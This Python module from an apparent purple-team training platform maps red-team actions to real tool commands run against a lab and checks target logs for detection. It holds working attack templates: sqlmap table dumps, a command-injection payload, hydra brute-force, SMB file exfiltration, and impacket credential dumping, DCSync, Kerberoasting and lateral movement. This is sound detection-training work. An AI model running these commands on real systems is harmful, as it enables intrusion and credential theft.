"""Live-fire mapping — turn a live Red action into a real tool command against the active lab.

Each entry maps a `red_playbook` action id to:
  - the real free/OSS tool that backs it,
  - a command template run inside the attacker box,
  - which lab *target role* it hits,
  - and an optional detection probe (a command run on the attacked target that prints a match count).

This module is **lab-agnostic**: whether an action can run is decided by whether the active lab has a
target with the required role — NOT by a hardcoded OS check. So the Docker range (web / fileserver
targets) realises network/web/SMB actions, and the Windows-AD lab (dc / workstation targets) realises
the Active-Directory credential actions. If the active lab has no matching target, the action returns
a clear "needs the … lab" result instead of executing.
"""
from __future__ import annotations

from dataclasses import dataclass

from .base import CommandResult, LabBackend, LabTarget


@dataclass(frozen=True)
class FireSpec:
    action_id: str
    tool: str
    function: str
    target_role: str                 # which lab target role to hit ("web"|"fileserver"|"dc"|"any")
    command: str                     # template: {target} {subnet} {domain} {user} {password}
    detect: str | None = None        # command run ON the attacked target that prints a match count
    label: str = ""


# Lab subnet for sweep-style commands (matches docker-compose.lab.yml).
LAB_SUBNET = "172.30.0.0/24"

# Friendly message when the active lab has no target for a mapped action.
_ROLE_HINTS = {
    "dc": "the Windows Active Directory lab (Phase 2)",
    "workstation": "the Windows Active Directory lab (Phase 2)",
    "web": "the Docker web lab (Phase 1)",
    "fileserver": "the Docker file-server lab (Phase 1)",
}

# A small log/event window query that prints a count — run ON the attacked target.
_WEB_LOG = "tail -n {n} /var/log/apache2/access.log 2>/dev/null | grep -c ."
# Windows Security/Sysmon event count over the last 5 minutes (PowerShell, via WinRM).
def _winlog(log: str, event_id: int) -> str:
    return (f"(Get-WinEvent -FilterHashtable @{{LogName='{log}';Id={event_id};"
            f"StartTime=(Get-Date).AddMinutes(-5)}} -ErrorAction SilentlyContinue | Measure-Object).Count")


FIRE_SPECS: list[FireSpec] = [
    # ---- Docker range (Linux targets) -----------------------------------------
    FireSpec(
        action_id="recon.fingerprint", tool="nmap", function="Network recon",
        target_role="web", command="nmap -sV -Pn -T4 {target}",
        detect=_WEB_LOG.format(n=200),
        label="Active service fingerprinting (nmap -sV)",
    ),
    FireSpec(
        action_id="intrecon.network", tool="nmap", function="Network discovery",
        target_role="any", command="nmap -sn {subnet}",
        label="Host discovery sweep (nmap -sn)",
    ),
    FireSpec(
        action_id="access.exposed_service", tool="nikto", function="Web vuln scan",
        target_role="web", command="nikto -h http://{target} -maxtime 30s -Tuning 1234b",
        detect=_WEB_LOG.format(n=500),   # nikto fires a burst — a spike in the access log is the signal
        label="Web vulnerability scan (nikto)",
    ),
    FireSpec(
        action_id="intrecon.identity_graph", tool="netexec", function="SMB enumeration",
        target_role="fileserver", command="nxc smb {target} -u guest -p '' --shares",
        label="SMB share & session enumeration (NetExec)",
    ),
    FireSpec(
        action_id="access.valid_creds", tool="netexec", function="Credential check",
        target_role="fileserver", command="nxc smb {target} -u smbuser -p 'Password123'",
        label="Authenticate with harvested credentials (NetExec)",
    ),
    # ---- Real web exploitation against DVWA (purpose-built to be exploited) ----
    FireSpec(
        action_id="web.dir_enum", tool="gobuster", function="Web content discovery",
        target_role="web",
        command="gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt -q -t 20 -k",
        detect=_WEB_LOG.format(n=500),
        label="Enumerate web content/paths (gobuster)",
    ),
    FireSpec(
        action_id="web.sqli", tool="sqlmap", function="SQL injection",
        target_role="web",
        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
                 "sqlmap -u \"http://{target}/vulnerabilities/sqli/?id=1&Submit=Submit\" "
                 "--cookie=\"$C\" --batch --flush-session --level=1 --risk=1 "
                 "-D dvwa -T users --dump'"),
        detect=_WEB_LOG.format(n=500),
        label="Dump the user table via SQL injection (sqlmap)",
    ),
    FireSpec(
        action_id="web.cmd_injection", tool="curl", function="Command injection (RCE)",
        target_role="web",
        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
                 "curl -s --cookie \"$C\" \"http://{target}/vulnerabilities/exec/\" "
                 "--data \"ip=127.0.0.1;id;uname -a&Submit=Submit\" "
                 "| sed -n \"/<pre>/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\"'"),
        detect=_WEB_LOG.format(n=200),
        label="Remote code execution via command injection (curl)",
    ),
    FireSpec(
        action_id="web.brute_force", tool="hydra", function="Online password brute-force",
        target_role="web",
        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
                 "printf \"letmein\\npassword\\nadmin\\n123456\\n\" >/tmp/pw.txt; "
                 "hydra -l admin -P /tmp/pw.txt {target} http-get-form "
                 "\"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:"
                 "Username and/or password incorrect.:H=Cookie\\: $C\" -f -t 4'"),
        detect=_WEB_LOG.format(n=200),
        label="Brute-force the login (hydra)",
    ),
    FireSpec(
        action_id="exfil.smb_files", tool="smbclient", function="SMB file exfiltration",
        target_role="fileserver",
        command="smbclient //{target}/public -N -c 'prompt OFF; recurse ON; ls; mget *'",
        label="Browse & download files from the share (smbclient)",
    ),
    # ---- Windows Active Directory lab (Phase 2) -------------------------------
    FireSpec(
        action_id="cred.lsass", tool="impacket", function="AD credential dump",
        target_role="dc", command="impacket-secretsdump {domain}/{user}:{password}@{target}",
        detect=_winlog("Security", 4624),     # logon(s) the dump triggers on the DC
        label="Dump credentials (impacket-secretsdump)",
    ),
    FireSpec(
        action_id="cred.kerberoast", tool="impacket", function="Kerberoasting",
        target_role="dc",
        command="impacket-GetUserSPNs -request -dc-ip {target} {domain}/{user}:{password}",
        detect=_winlog("Security", 4769),      # Kerberos service-ticket requests
        label="Kerberoast service accounts (impacket)",
    ),
    FireSpec(
        action_id="cred.dcsync", tool="impacket", function="DCSync",
        target_role="dc",
        command="impacket-secretsdump -just-dc {domain}/{user}:{password}@{target}",
        detect=_winlog("Security", 4662),      # DRSUAPI directory replication
        label="DCSync domain secrets (impacket)",
    ),
    FireSpec(
        action_id="lateral.move", tool="impacket", function="Lateral movement",
        target_role="dc",
        command="impacket-wmiexec {domain}/{user}:{password}@{target} whoami",
        detect=_winlog("Microsoft-Windows-Sysmon/Operational", 1),  # process create (wmiprvse->cmd)
        label="Lateral movement via WMI (impacket)",
    ),
]

FIRE_BY_ACTION = {f.action_id: f for f in FIRE_SPECS}


def has_spec(action_id: str) -> bool:
    return action_id in FIRE_BY_ACTION


def spec_for(action_id: str) -> FireSpec | None:
    return FIRE_BY_ACTION.get(action_id)


def _pick_target(lab: LabBackend, role: str) -> LabTarget | None:
    targets = lab.targets()
    if not targets:
        return None
    if role == "any":
        return targets[0]
    return next((t for t in targets if t.role == role), None)


def queued_view(action_id: str) -> dict:
    """The 'pending' badge shown on the action event the instant the operator fires it."""
    f = FIRE_BY_ACTION.get(action_id)
    if f is None:
        return {}
    return {"status": "queued", "tool": f.tool, "function": f.function, "label": f.label or action_id}


def run_job(lab: LabBackend, action_id: str) -> dict:
    """Execute the real tool for an action and probe for detection. BLOCKING — call via a thread."""
    f = FIRE_BY_ACTION.get(action_id)
    if f is None:
        return {"status": "skipped", "reason": "no live-fire mapping"}

    base = {"status": "done", "tool": f.tool, "function": f.function, "label": f.label or action_id}

    target = _pick_target(lab, f.target_role)
    if target is None:
        hint = _ROLE_HINTS.get(f.target_role, f"a lab target with role '{f.target_role}'")
        return {**base, "status": "unavailable", "success": False, "command": f.command,
                "output": f"{f.tool} for {action_id} requires {hint}. "
                          f"Not available on the current lab.",
                "requires": f.target_role}

    creds = lab.credentials()
    command = f.command.format(
        target=target.host, subnet=LAB_SUBNET,
        domain=creds.get("domain", ""), user=creds.get("user", ""),
        password=creds.get("password", ""),
    )
    result: CommandResult = lab.run_in_attacker(command, timeout=120)

    detected, evidence = _probe_detection(lab, target, f.detect)

    return {
        **base,
        "success": result.success,
        "command": command,
        "target": target.public(),
        "output": (result.stdout or result.stderr or "").strip()[:6000],
        "exit_code": result.exit_code,
        "duration_ms": result.duration_ms,
        "detected": detected,
        "detection_evidence": evidence,
        "detection_source": "target-logs" if target.os == "linux" else "windows-event-log",
    }


def _probe_detection(lab: LabBackend, target: LabTarget, detect_cmd: str | None) -> tuple[bool, str]:
    """Confirm the attack landed by running a count query ON the attacked target."""
    if not detect_cmd:
        return False, ""
    res = lab.run_in_target(target.id, detect_cmd, timeout=25)
    first = (res.stdout or "0").strip().splitlines()[0] if res.stdout else "0"
    try:
        count = int(first)
    except ValueError:
        count = 0
    if count > 0:
        where = "service log" if target.os == "linux" else "Windows event log"
        return True, f"{count} matching {where} entr{'y' if count == 1 else 'ies'} on {target.name}"
    return False, ""
